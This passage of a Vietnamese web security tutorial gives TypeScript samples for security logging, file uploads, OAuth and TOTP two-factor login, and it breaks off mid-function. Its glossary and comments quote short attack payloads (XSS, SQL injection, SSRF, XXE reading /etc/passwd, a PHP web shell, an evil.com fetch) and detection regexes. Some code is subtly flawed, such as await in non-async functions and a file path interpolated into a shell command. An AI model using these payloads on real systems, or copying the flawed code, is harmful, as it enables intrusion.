// ✅ CÁCH SỬA: Dùng environment variables
// File: .env
// JWT_SECRET=randomly-generated-secure-key-xyz789
// API_KEY=sk_live_abc123xyz

// Code:
const JWT_SECRET = process.env.JWT_SECRET; // ✅ Đọc từ env
const API_KEY = process.env.API_KEY;

// .gitignore phải có .env để không commit secrets

// ❌ LỖI 7: CORS wildcard trong production
// Vấn đề: Cho phép mọi domain call API
app.use(cors({ origin: '*' })); // ❌ Mọi domain đều gọi được

// ✅ CÁCH SỬA: Whitelist domains cụ thể
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // ✅ Chỉ cho phép domains này
    credentials: true,
  })
);
```

**Monitoring & Logging (Giám Sát & Ghi Log Bảo Mật):**

```typescript
// ✅ Security Event Logging System
// Mục đích: Phát hiện và theo dõi các hoạt động bất thường

import winston from 'winston'; // Thư viện logging mạnh mẽ

// Cấu hình logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi vào file
    new winston.transports.File({ filename: 'security.log' }),
    // Gửi đến service giám sát (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

// 1. Log Failed Login Attempts (Lần Thử Login Thất Bại)
// Phát hiện brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Thử login thất bại: ${email} từ IP ${ip}`,
  });

  // Kiểm tra số lần thử thất bại
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `⚠️ Phát hiện brute-force: ${failedAttempts} lần thử từ ${ip}`,
    });

    // Block IP tạm thời
    await blockIP(ip, 3600); // Block 1 giờ

    // Gửi alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Hoạt Động Đáng Ngờ)
// VD: User truy cập nhiều accounts, transfer số tiền bất thường
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Hoạt động đáng ngờ: User ${userId} - ${action}`,
  });

  // VD: Transfer số tiền lớn bất thường
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // Gửi OTP xác nhận
    await sendOTP(userId);

    // Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Thử Tấn Công XSS)
// Phát hiện khi user nhập script tags hoặc malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags hoặc javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Chỉ log 200 ký tự đầu
      timestamp: new Date(),
      message: `⚠️ Phát hiện XSS attempt từ IP ${ip}`,
    });

    // Block IP ngay lập tức
    await blockIP(ip, 86400); // Block 24 giờ

    // Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

// 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `⚠️ SQL injection attempt từ ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

// 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} từ ${ip} - ${
      success ? 'Thành công' : 'Thất bại'
    }`,
  });
}

// 6. Real-time Monitoring Dashboard
// Hiển thị logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// Gửi security events real-time đến dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit đến security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

// Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss://your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Keep 100 alerts

      // Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>🛡️ Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// 📊 METRICS TRACKING (Theo dõi chỉ số)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

// Track metrics theo thời gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// Gửi metrics đến monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('📊 Security Metrics:', metrics);
}, 60000); // Mỗi phút
```

---

## **📚 GLOSSARY - Giải Thích Các Thuật Ngữ & Viết Tắt**

### **🔤 Các Từ Viết Tắt (Abbreviations)**

| Viết Tắt          | Đầy Đủ                                              | Giải Thích                                                                      | Ví Dụ                                                                           |
| ----------------- | --------------------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **XSS**           | Cross-Site Scripting                                | Lỗ hổng cho phép hacker inject JavaScript vào trang web → đánh cắp dữ liệu user | User nhập: `<script>alert('hack')</script>`                                     |
| **CSRF**          | Cross-Site Request Forgery                          | Tấn công buộc user thực hiện hành động không mong muốn trên site đang login     | User đã login bank.com → click link evil.com → evil.com gửi request chuyển tiền |
| **SQL Injection** | SQL Code Injection                                  | Inject SQL code vào query → truy cập/xóa database                               | Input: `' OR '1'='1` → bypass login                                             |
| **HTTPS**         | HTTP Secure                                         | HTTP + TLS encryption → mã hóa dữ liệu giữa browser ↔ server                    | URL bắt đầu với `https://`                                                      |
| **TLS**           | Transport Layer Security                            | Protocol mã hóa dữ liệu khi truyền qua mạng (thay thế SSL)                      | HTTPS sử dụng TLS 1.3                                                           |
| **SSL**           | Secure Sockets Layer                                | Protocol mã hóa cũ (đã lỗi thời, thay bằng TLS)                                 | SSL 3.0 có lỗ hổng POODLE                                                       |
| **HSTS**          | HTTP Strict Transport Security                      | Header bắt buộc browser dùng HTTPS, không cho HTTP                              | `Strict-Transport-Security: max-age=31536000`                                   |
| **CSP**           | Content Security Policy                             | Header quy định nguồn nào được phép load scripts/styles/images                  | `script-src 'self' https://cdn.com`                                             |
| **CORS**          | Cross-Origin Resource Sharing                       | Cơ chế cho phép domain khác gọi API của bạn                                     | API cho phép `https://app.com` gọi `https://api.com`                            |
| **JWT**           | JSON Web Token                                      | Token chứa thông tin user được mã hóa + ký bằng secret key                      | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`                                       |
| **API**           | Application Programming Interface                   | Giao diện cho phép apps giao tiếp với nhau                                      | REST API: `GET /api/users`                                                      |
| **DDoS**          | Distributed Denial of Service                       | Tấn công làm quá tải server bằng hàng triệu requests                            | Botnet gửi 10 triệu requests/giây                                               |
| **MitM**          | Man-in-the-Middle                                   | Hacker chặn giữa browser ↔ server để đọc/sửa dữ liệu                            | Hacker ở quán cafe chặn WiFi public                                             |
| **2FA/MFA**       | Two-Factor/Multi-Factor Authentication              | Xác thực 2 bước (password + OTP/SMS/app)                                        | Login = password + code từ Google Authenticator                                 |
| **OTP**           | One-Time Password                                   | Mật khẩu 1 lần, hết hạn sau vài phút                                            | SMS: "Mã xác nhận: 123456 (5 phút)"                                             |
| **CAPTCHA**       | Completely Automated Public Turing test             | Test phân biệt người vs bot (chọn hình, nhập chữ)                               | "Chọn tất cả ô có đèn giao thông"                                               |
| **WAF**           | Web Application Firewall                            | Tường lửa bảo vệ web app khỏi attacks (XSS, SQL injection)                      | Cloudflare WAF, AWS WAF                                                         |
| **SRI**           | Subresource Integrity                               | Verify file từ CDN không bị sửa đổi (hash check)                                | `<script integrity="sha384-abc123...">`                                         |
| **OAuth**         | Open Authorization                                  | Protocol cho phép app truy cập dữ liệu user mà không cần password               | "Login with Google", "Login with Facebook"                                      |
| **OIDC**          | OpenID Connect                                      | Layer trên OAuth 2.0 cho authentication                                         | Google Sign-In sử dụng OIDC                                                     |
| **SAML**          | Security Assertion Markup Language                  | Protocol SSO cho enterprise (XML-based)                                         | Employee login 1 lần → truy cập tất cả apps công ty                             |
| **SSO**           | Single Sign-On                                      | Login 1 lần → truy cập nhiều apps                                               | Login Google → tự động login YouTube, Gmail, Drive                              |
| **SSRF**          | Server-Side Request Forgery                         | Trick server gửi request đến internal resources                                 | Exploit: `GET /api/image?url=http://localhost:6379`                             |
| **XXE**           | XML External Entity                                 | Inject XML entity để đọc files hoặc SSRF                                        | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                     |
| **RCE**           | Remote Code Execution                               | Chạy code từ xa trên server (rất nguy hiểm!)                                    | Upload shell.php → chạy `system($_GET['cmd'])`                                  |
| **LFI/RFI**       | Local/Remote File Inclusion                         | Include file không an toàn → RCE                                                | `include($_GET['page'] . '.php')` → LFI                                         |
| **IDOR**          | Insecure Direct Object Reference                    | Truy cập object của user khác bằng cách thay đổi ID                             | `GET /api/user/123` → thay 123 thành 456                                        |
| **CDN**           | Content Delivery Network                            | Mạng phân phối nội dung toàn cầu (cache static files)                           | Cloudflare, AWS CloudFront                                                      |
| **PII**           | Personally Identifiable Information                 | Thông tin cá nhân nhận diện được (email, phone, SSN)                            | Email, số điện thoại, CMND/CCCD                                                 |
| **GDPR**          | General Data Protection Regulation                  | Luật bảo vệ dữ liệu cá nhân của EU                                              | Right to be forgotten, data portability                                         |
| **HIPAA**         | Health Insurance Portability and Accountability Act | Luật bảo vệ dữ liệu y tế (US)                                                   | Encrypt patient medical records                                                 |
| **PCI-DSS**       | Payment Card Industry Data Security Standard        | Chuẩn bảo mật thẻ tín dụng                                                      | Encrypt credit card numbers, no store CVV                                       |

### **🔐 Các Thuật Ngữ Bảo Mật (Security Terms)**

<details>
<summary><strong>Authentication (Xác Thực)</strong></summary>

**Định nghĩa:** Xác minh danh tính user (bạn là ai?)

**Các phương pháp:**

- **Password**: Cách phổ biến nhất (hash với bcrypt)
- **2FA/MFA**: Password + OTP/SMS/app
- **Biometric**: Vân tay, khuôn mặt
- **OAuth/OIDC**: Login with Google/Facebook

**Ví dụ:**

```typescript
// Verify user identity
const user = await User.findOne({ email });
const valid = await bcrypt.compare(password, user.passwordHash);
if (!valid) throw new Error('Sai mật khẩu');
```

</details>

<details>
<summary><strong>Authorization (Phân Quyền)</strong></summary>

**Định nghĩa:** Kiểm tra quyền truy cập (bạn được làm gì?)

**Các mô hình:**

- **RBAC** (Role-Based Access Control): Phân quyền theo role (admin, user, guest)
- **ABAC** (Attribute-Based Access Control): Phân quyền theo attributes
- **ACL** (Access Control List): Danh sách quyền cho từng resource

**Ví dụ:**

```typescript
// Check user permission
const checkPermission = (user, action) => {
  if (user.role === 'admin') return true;
  if (user.role === 'user' && action === 'read') return true;
  return false;
};
```

</details>

<details>
<summary><strong>Encryption (Mã Hóa)</strong></summary>

**Định nghĩa:** Chuyển plaintext → ciphertext (có thể giải mã)

**Các loại:**

- **Symmetric**: Cùng 1 key (AES-256)
- **Asymmetric**: 2 keys - public + private (RSA)

**Ví dụ:**

```typescript
// AES-256-GCM encryption
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
let encrypted = cipher.update(plaintext, 'utf8', 'hex');
encrypted += cipher.final('hex');
```

</details>

<details>
<summary><strong>Hashing (Băm)</strong></summary>

**Định nghĩa:** Chuyển input → fixed-length output (KHÔNG thể giải mã)

**Use cases:**

- **Password storage**: bcrypt, argon2
- **Data integrity**: SHA-256, SHA-512
- **Search encrypted fields**: SHA-256 hash index

**Ví dụ:**

```typescript
// Hash password (one-way)
const hash = await bcrypt.hash(password, 10);
// KHÔNG thể: const password = bcrypt.decrypt(hash); ❌
```

</details>

<details>
<summary><strong>Salt (Muối)</strong></summary>

**Định nghĩa:** Random string thêm vào password trước khi hash

**Tại sao cần?** Chống rainbow table attack (precomputed hash dictionary)

**Ví dụ:**

```typescript
// Password: "123456"
// Hash without salt: "e10adc3949ba59abbe56e057f20f883e" (giống nhau cho tất cả user)
// Hash with salt: mỗi user có hash khác nhau (vì salt random)

const salt = await bcrypt.genSalt(10); // Generate random salt
const hash = await bcrypt.hash(password, salt); // "123456" + salt → unique hash
```

</details>

<details>
<summary><strong>Token</strong></summary>

**Định nghĩa:** Chuỗi ký tự đại diện cho session/authentication

**Các loại:**

- **Access Token**: Ngắn hạn (15 phút), dùng để gọi API
- **Refresh Token**: Dài hạn (7 ngày), dùng để lấy access token mới
- **CSRF Token**: Chống CSRF attack
- **API Key**: Xác thực app/service

**Ví dụ:**

```typescript
// JWT Token structure
{
  "header": { "alg": "HS256", "typ": "JWT" },
  "payload": { "userId": "123", "email": "user@example.com", "exp": 1234567890 },
  "signature": "abc123..."
}
```

</details>

<details>
<summary><strong>Cookie</strong></summary>

**Định nghĩa:** Data lưu ở browser, tự động gửi kèm mỗi request

**Attributes:**

- **httpOnly**: JavaScript không đọc được (chống XSS)
- **secure**: Chỉ gửi qua HTTPS
- **sameSite**: Chống CSRF (strict/lax/none)
- **maxAge**: Thời gian sống (seconds)

**Ví dụ:**

```typescript
res.cookie('refreshToken', token, {
  httpOnly: true, // XSS không steal được
  secure: true, // Chỉ HTTPS
  sameSite: 'strict', // Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
});
```

</details>

<details>
<summary><strong>Same-Origin Policy (SOP)</strong></summary>

**Định nghĩa:** Browser chỉ cho phép JavaScript từ origin A đọc dữ liệu từ origin A

**Origin = Protocol + Domain + Port**

- `https://example.com:443` ≠ `http://example.com:80` (khác protocol)
- `https://example.com` ≠ `https://api.example.com` (khác subdomain)

**Tại sao quan trọng?** Ngăn evil.com đọc dữ liệu từ bank.com

**Ví dụ:**

```javascript
// Ở trang https://bank.com
fetch('https://api.bank.com/balance'); // ✅ Same origin
fetch('https://evil.com/steal'); // ❌ Blocked by SOP

// Nếu không có SOP:
// evil.com có thể: fetch('https://bank.com/transfer?to=hacker&amount=1000000')
// → Steal tiền (vì browser tự động gửi cookies)
```

</details>

---

## **🔐 8️⃣ ADDITIONAL SECURITY TOPICS - Các Chủ Đề Bảo Mật Bổ Sung**

### **📁 8.1. FILE UPLOAD SECURITY - Bảo Mật Upload File**

**⚠️ Vấn Đề:** File upload là vector tấn công phổ biến

**Threats:**

- Upload shell.php → RCE (Remote Code Execution)
- Upload virus/malware
- Upload file quá lớn → DoS
- Path traversal: `../../etc/passwd`

```typescript
// =====================================
// FILE UPLOAD SECURITY IMPLEMENTATION
// =====================================

import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import { promisify } from 'util';
import { exec } from 'child_process';

const execAsync = promisify(exec);

// 🛡️ A. Validate File Type (MIME Type + Extension)
const ALLOWED_MIME_TYPES = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf',
];

const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];

const validateFileType = (file: Express.Multer.File): boolean => {
  // ✅ Check 1: MIME type
  if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
    return false;
  }

  // ✅ Check 2: File extension
  const ext = path.extname(file.originalname).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return false;
  }

  // ✅ Check 3: Magic number (file signature)
  // Đọc bytes đầu file để verify thật sự là image
  // VD: JPEG bắt đầu với FF D8 FF, PNG với 89 50 4E 47
  const buffer = file.buffer.slice(0, 4);
  const magicNumber = buffer.toString('hex');

  const validSignatures: Record<string, string[]> = {
    'image/jpeg': ['ffd8ffe0', 'ffd8ffe1', 'ffd8ffdb'],
    'image/png': ['89504e47'],
    'image/gif': ['47494638'],
  };

  const signatures = validSignatures[file.mimetype];
  if (signatures && !signatures.some((sig) => magicNumber.startsWith(sig))) {
    return false;
  }

  return true;
};

// 🛡️ B. Sanitize Filename (Chống Path Traversal)
const sanitizeFilename = (filename: string): string => {
  // ❌ Filename nguy hiểm: "../../etc/passwd"
  // ❌ Filename nguy hiểm: "shell.php.jpg" (double extension)

  // ✅ Bước 1: Generate random filename (không dùng filename gốc)
  const ext = path.extname(filename).toLowerCase();
  const randomName = crypto.randomBytes(16).toString('hex');
  const safeFilename = `${randomName}${ext}`;

  // ✅ Bước 2: Remove path separators (/, \)
  return safeFilename.replace(/[\/\\]/g, '');
};

// 🛡️ C. Limit File Size
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const upload = multer({
  storage: multer.memoryStorage(), // Lưu trong memory để validate trước
  limits: {
    fileSize: MAX_FILE_SIZE, // Giới hạn 5MB
    files: 5, // Tối đa 5 files cùng lúc
  },
  fileFilter: (req, file, cb) => {
    // Validate file type trước khi upload
    if (!validateFileType(file)) {
      cb(new Error('File type not allowed'), false);
    } else {
      cb(null, true);
    }
  },
});

// 🛡️ D. Scan for Malware (ClamAV)
async function scanFileForVirus(filePath: string): Promise<boolean> {
  try {
    // ClamAV: Open-source antivirus
    const { stdout } = await execAsync(`clamscan --no-summary ${filePath}`);

    if (stdout.includes('FOUND')) {
      console.log('⚠️ Virus detected:', stdout);
      return false; // Virus found
    }

    return true; // Clean file
  } catch (error) {
    console.error('Virus scan failed:', error);
    return false; // Assume unsafe nếu scan fail
  }
}

// 🛡️ E. Store Outside Web Root
// ❌ BAD: Lưu trong public folder → user truy cập trực tiếp
// /public/uploads/shell.php → http://example.com/uploads/shell.php (RCE!)

// ✅ GOOD: Lưu ngoài web root
const UPLOAD_DIR = '/var/uploads'; // Ngoài /var/www/html (web root)

// Serve files qua API với authentication
app.get('/api/files/:fileId', authenticateToken, async (req, res) => {
  const fileId = req.params.fileId;

  // Get file metadata from database
  const file = await db.files.findOne({ id: fileId, userId: req.user.id });

  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }

  // ✅ Check user permission
  if (file.userId !== req.user.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Serve file
  const filePath = path.join(UPLOAD_DIR, file.filename);
  res.download(filePath, file.originalName);
});

// 🛡️ F. Complete Upload Handler
app.post(
  '/api/upload',
  authenticateToken,
  upload.single('file'),
  async (req, res) => {
    try {
      const file = req.file;

      if (!file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }

      // ✅ Validate file type
      if (!validateFileType(file)) {
        return res.status(400).json({ error: 'Invalid file type' });
      }

      // ✅ Sanitize filename
      const safeFilename = sanitizeFilename(file.originalname);

      // ✅ Save file to disk (outside web root)
      const filePath = path.join(UPLOAD_DIR, safeFilename);
      await fs.promises.writeFile(filePath, file.buffer);

      // ✅ Scan for virus
      const isClean = await scanFileForVirus(filePath);
      if (!isClean) {
        // Delete file ngay lập tức
        await fs.promises.unlink(filePath);
        return res.status(400).json({ error: 'File contains malware' });
      }

      // ✅ Save metadata to database
      const fileRecord = await db.files.create({
        id: crypto.randomUUID(),
        userId: req.user.id,
        originalName: file.originalname,
        filename: safeFilename,
        mimetype: file.mimetype,
        size: file.size,
        uploadedAt: new Date(),
      });

      res.json({
        success: true,
        file: {
          id: fileRecord.id,
          name: fileRecord.originalName,
          size: fileRecord.size,
          url: `/api/files/${fileRecord.id}`,
        },
      });
    } catch (error) {
      console.error('Upload error:', error);
      res.status(500).json({ error: 'Upload failed' });
    }
  }
);

// 📋 FILE UPLOAD SECURITY CHECKLIST
/*
✅ Validate MIME type + extension + magic number
✅ Sanitize filename (không dùng filename gốc)
✅ Limit file size
✅ Scan for malware
✅ Store outside web root
✅ Serve files via API với authentication
✅ Set correct Content-Type khi serve
✅ Implement rate limiting (chống spam upload)
✅ Log upload events
✅ Backup uploaded files
*/
```

---

### **👤 8.2. OAUTH 2.0 & OPENID CONNECT - Login with Social**

**📌 Tình huống:** Implement "Login with Google", "Login with Facebook"

**Giải thích:**

- **OAuth 2.0**: Protocol cho phép app truy cập dữ liệu user mà không cần password
- **OpenID Connect (OIDC)**: Layer trên OAuth 2.0 để authentication

```typescript
// =====================================
// OAUTH 2.0 + OIDC IMPLEMENTATION
// =====================================

import { Strategy as GoogleStrategy } from 'passport-google-oauth20';
import passport from 'passport';

// 🔐 A. Google OAuth Strategy
passport.use(
  new GoogleStrategy(
    {
      clientID: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
      callbackURL: 'https://yourapp.com/auth/google/callback',
    },
    async (accessToken, refreshToken, profile, done) => {
      try {
        // ✅ Check if user exists
        let user = await db.users.findOne({ googleId: profile.id });

        if (!user) {
          // ✅ Create new user
          user = await db.users.create({
            googleId: profile.id,
            email: profile.emails[0].value,
            name: profile.displayName,
            avatar: profile.photos[0].value,
            provider: 'google',
            createdAt: new Date(),
          });
        }

        // ✅ Return user
        done(null, user);
      } catch (error) {
        done(error, null);
      }
    }
  )
);

// 🔐 B. OAuth Routes
// Step 1: Redirect to Google login page
app.get(
  '/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email'], // Request permissions
  })
);

// Step 2: Google callback (user login thành công)
app.get(
  '/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // ✅ Generate JWT tokens
    const accessToken = jwt.sign(
      { userId: req.user.id, email: req.user.email },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    const refreshToken = jwt.sign(
      { userId: req.user.id },
      process.env.REFRESH_TOKEN_SECRET!,
      { expiresIn: '7d' }
    );

    // ✅ Set refresh token in httpOnly cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    // ✅ Redirect to frontend với access token
    res.redirect(`https://yourapp.com/auth/callback?token=${accessToken}`);
  }
);

// 🔐 C. Frontend Implementation (React)
function LoginPage() {
  const handleGoogleLogin = () => {
    // Redirect to backend OAuth route
    window.location.href = 'https://api.yourapp.com/auth/google';
  };

  return (
    <div>
      <h2>Login</h2>
      <button onClick={handleGoogleLogin}>🔑 Login with Google</button>
    </div>
  );
}

// Callback handler (nhận token từ backend)
function AuthCallback() {
  useEffect(() => {
    // Extract token from URL
    const params = new URLSearchParams(window.location.search);
    const token = params.get('token');

    if (token) {
      // ✅ Store access token in memory (Context/Zustand)
      authStore.setAccessToken(token);

      // ✅ Redirect to dashboard
      navigate('/dashboard');
    }
  }, []);

  return <div>Đang xử lý login...</div>;
}

// 📊 OAUTH FLOW DIAGRAM
/*
┌──────────┐                                     ┌─────────────┐
│  User    │                                     │   Google    │
└────┬─────┘                                     └──────┬──────┘
     │                                                  │
     │  1. Click "Login with Google"                   │
     ├──────────────────────────────────────────►      │
     │                                                  │
     │  2. Redirect to Google login                    │
     │  ◄──────────────────────────────────────────────┤
     │                                                  │
     │  3. User login + approve permissions            │
     ├──────────────────────────────────────────►      │
     │                                                  │
     │  4. Google redirects to callback + auth code    │
     │  ◄──────────────────────────────────────────────┤
     │                                                  │
┌────▼─────┐                                     ┌──────▼──────┐
│ Backend  │  5. Exchange code for tokens        │   Google    │
└────┬─────┘  ────────────────────────────────►  └──────┬──────┘
     │                                                   │
     │        6. Return user profile + tokens           │
     │   ◄───────────────────────────────────────────────┤
     │                                                   │
     │  7. Create/find user in DB                       │
     │  8. Generate JWT tokens                          │
     │  9. Set refresh token cookie                     │
     │  10. Redirect to frontend với access token       │
     │                                                   │
┌────▼─────┐                                            │
│ Frontend │  11. Store token + redirect to dashboard  │
└──────────┘                                            │
*/

// 🔐 D. Security Best Practices for OAuth

// ✅ 1. Validate state parameter (chống CSRF)
app.get('/auth/google', (req, res, next) => {
  const state = crypto.randomBytes(16).toString('hex');

  // Save state in session
  req.session.oauthState = state;

  passport.authenticate('google', {
    scope: ['profile', 'email'],
    state, // Pass state to Google
  })(req, res, next);
});

app.get('/auth/google/callback', (req, res, next) => {
  const state = req.query.state;

  // ✅ Verify state matches
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }

  // Clear state
  delete req.session.oauthState;

  passport.authenticate('google')(req, res, next);
});

// ✅ 2. Use PKCE (Proof Key for Code Exchange) - for SPAs
// PKCE adds extra security layer for public clients (mobile apps, SPAs)

// ✅ 3. Limit scope (chỉ request permissions cần thiết)
// ❌ BAD: scope: ['profile', 'email', 'drive', 'calendar', 'contacts']
// ✅ GOOD: scope: ['profile', 'email']

// ✅ 4. Validate email verified
passport.use(
  new GoogleStrategy(
    {
      // ...
    },
    async (accessToken, refreshToken, profile, done) => {
      // ✅ Check if email is verified
      const email = profile.emails[0];
      if (!email.verified) {
        return done(new Error('Email not verified'), null);
      }

      // ...
    }
  )
);
```

---

### **🔒 8.3. TWO-FACTOR AUTHENTICATION (2FA) - Xác Thực 2 Bước**

**📌 Tại sao cần 2FA?**

- Password có thể bị đoán/leak
- 2FA thêm 1 layer bảo mật: **Something you know (password) + Something you have (phone/app)**

```typescript
// =====================================
// 2FA IMPLEMENTATION với TOTP (Time-based OTP)
// =====================================

import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// 🔐 A. Enable 2FA - Generate Secret
app.post('/api/2fa/enable', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.id);

  if (user.twoFactorEnabled) {
    return res.status(400).json({ error: '2FA đã được kích hoạt' });
  }

  // ✅ Generate secret key
  const secret = speakeasy.generateSecret({
    name: `YourApp (${user.email})`, // Hiển thị trong Authenticator app
    issuer: 'YourApp',
  });

  // ✅ Save secret (chưa enable, đợi user verify)
  await db.users.update(req.user.id, {
    twoFactorSecret: secret.base32, // Lưu secret (mã hóa trước!)
    twoFactorEnabled: false, // Chưa enable
  });

  // ✅ Generate QR code để user scan
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);

  res.json({
    secret: secret.base32, // User có thể nhập manual
    qrCode: qrCodeUrl, // Hoặc scan QR code
  });
});

// 🔐 B. Verify 2FA Code và Enable
app.post('/api/2fa/verify', authenticateToken, async (req, res) => {
  const { code } = req.body;

  const user = await db.users.findById(req.user.id);

  // ✅ Verify TOTP code
  const verified = speakeasy.totp.verify({
    secret: user.twoFactorSecret,
    encoding: 'base32',
    token: code,
    window: 2, // Cho phép ±2 time windows (60 seconds)
  });

  if (!verified) {
    return res.status(400).json({ error: 'Mã xác thực không đúng' });
  }

  // ✅ Enable 2FA
  await db.users.update(req.user.id, {
    twoFactorEnabled: true,
  });

  // ✅ Generate backup codes (để recover khi mất phone)
  const backupCodes = Array.from({ length: 10 }, () =>
    crypto.randomBytes(4).toString('hex').toUpperCase()
  );

  // Save hashed backup codes
  await db.users.update(req.user.id, {
    backupCodes: backupCodes.map((code) => bcrypt.hashSync(code, 10)),
  });

  res.json({
    success: true,
    message: '2FA đã được kích hoạt',
    backupCodes, // Show once, user phải lưu lại
  });
});

// 🔐 C. Login with 2FA
app.post('/api/login', async (req, res) => {
  const { email, password, twoFactorCode } = req.body;

  // ✅ Step 1: Verify password
  const user = await db.users.findOne({ email });
  if (!user) {
    return res.status(401).json({ error: 'Email không tồn tại' });
  }

  const validPassword = await bcrypt.compare(password, user.passwordHash);
  if (!validPassword) {
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
  }

  // ✅ Step 2: Check if 2FA enabled
  if (user.twoFactorEnabled) {
    if (!twoFactorCode) {
      // Yêu cầu user nhập 2FA code
      return res.status(403).json({
        error: '2FA_REQUIRED',
        message: 'Vui lòng nhập mã xác thực 2FA',
      });
    }

    // ✅ Verify 2FA code
    const verified = speakeasy.totp.verify({
      secret: user.twoFactorSecret,
      encoding: 'base32',
      token: twoFactorCode,
      window: 2,
    });

    if (!verified) {
      // ❌ 2FA code sai
      return res.status(401).json({ error: 'Mã xác thực không đúng' });
    }
  }

  // ✅ Step 3: Generate JWT tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_TOKEN_SECRET!,
    { expiresIn: '7d' }
  );

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  res.json({ accessToken });
});

// 🔐 D. Backup Code Login (khi mất phone)
app.post('/api/login/backup-code', async (req, res) => {
  const { email, password, backupCode } = req.body;

  const user = await db.users.findOne({ email });

  // Verify password...

  // ✅ Check backup code
  const validBackupCode = user.backupCodes.some((hashedCode) =>
    bcrypt.compareSync(backupCode, hashedCode)
  );

  if (!validBackupCode) {
